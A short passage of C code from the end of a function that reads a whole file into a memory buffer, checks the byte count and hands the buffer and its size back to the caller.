    fclose(f);

    if (bytesRead != fileSize) {
        free(buffer);
        return FALSE;
    }

    *magiccode = buffer;
    *magiccodeSize = (SIZE_T)fileSize;
    return TRUE;
}